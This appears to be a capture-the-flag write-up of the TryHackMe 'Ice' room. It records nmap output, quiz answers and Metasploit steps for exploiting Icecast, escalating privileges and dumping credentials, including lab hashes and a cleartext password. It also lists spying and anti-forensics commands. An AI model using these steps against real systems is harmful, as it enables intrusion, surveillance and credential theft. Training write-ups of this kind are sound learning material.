@@ -1,0 +1,201 @@
+Nmap Scan 
+
+root@natzsec:~/Desktop/tryhackme/boxes/ice# nmap -sC -sV -oA nmap/all 10.10.89.255
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-10 07:09 IST
+Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 8.33% done; ETC: 07:10 (0:01:06 remaining)
+Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 41.67% done; ETC: 07:10 (0:00:17 remaining)
+Nmap scan report for 10.10.89.255
+Host is up (0.25s latency).
+Not shown: 988 closed ports
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  tcpwrapped
+5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+8000/tcp  open  http         Icecast streaming media server
+|_http-title: Site doesn't have a title (text/html).
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+49159/tcp open  msrpc        Microsoft Windows RPC
+49160/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: 0s
+|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:1b:26:66:de:2e (unknown)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Dark-PC
+|   NetBIOS computer name: DARK-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-05-09T20:40:51-05:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-05-10T01:40:50
+|_  start_date: 2020-05-10T00:34:45
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 147.22 seconds
+
+Task 2
+#3 Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?
+
+3389
+
+#4 What service did nmap identify as running on port 8000? (First word of this service)
+Icecast
+
+#5 What does Nmap identify as the hostname of the machine? (All caps for the answer)
+
+DARK-PC
+
+TASK 3
+
+#1 Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it? Use https://www.cvedetails.com for this question and the next.
+
+Execute code overflow
+
+#2 What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
+
+CV-2004-1561
+
+#4 After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in 'RP: Metasploit' which is recommended to be completed prior to this room, although not entirely necessary. 
+
+exploit/windows/http/icecast_header
+
+ #6 Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank? 
+
+RHOSTS
+
+TASK 4
+
+#1 Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?
+
+Meterpreter
+
+#2  What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'RP: Metasploit' room. 
+
+dark
+
+#3 What build of Windows is the system?
+
+7601
+
+#4 Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?
+
+x64
+
+#5 Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*
+
+#6 Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?
+
+exploit/windows/local/bypassuac_eventvwr
+
+#10 Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?
+
+LHOST
+
+#14 We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?
+
+SeTakeOwnershipPrivilege
+
+Task 5
+
+#2 In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?
+
+Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. 
+
+spoolsv.exe
+
+#4 Let's check what user we are now with the command `getuid`. What user is listed?
+
+NT AUTHORITY\SYSTEM
+
+#7 Which command allows up to retrieve all credentials?
+
+creds_all
+
+#8 Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled).
+
+Password01!
+
+meterpreter > creds_all
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username  Domain   LM                                NTLM                              SHA1
+--------  ------   --                                ----                              ----
+Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb
+
+wdigest credentials
+===================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+DARK-PC$  WORKGROUP  (null)
+Dark      Dark-PC    Password01!
+
+tspkg credentials
+=================
+
+Username  Domain   Password
+--------  ------   --------
+Dark      Dark-PC  Password01!
+
+kerberos credentials
+====================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+Dark      Dark-PC    Password01!
+dark-pc$  WORKGROUP  (null)
+
+
+meterpreter > 
+
+Task 6
+
+#2 What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)
+
+hashdump
+
+#3 While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?
+
+screenshare
+
+#4  How about if we wanted to record from a microphone attached to the system? 
+
+record_mic
+
+#5 To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.
+
+timestomp
+
+#6  	
+
+Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?
+
+Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.
+
+golden_ticket_create
+
+
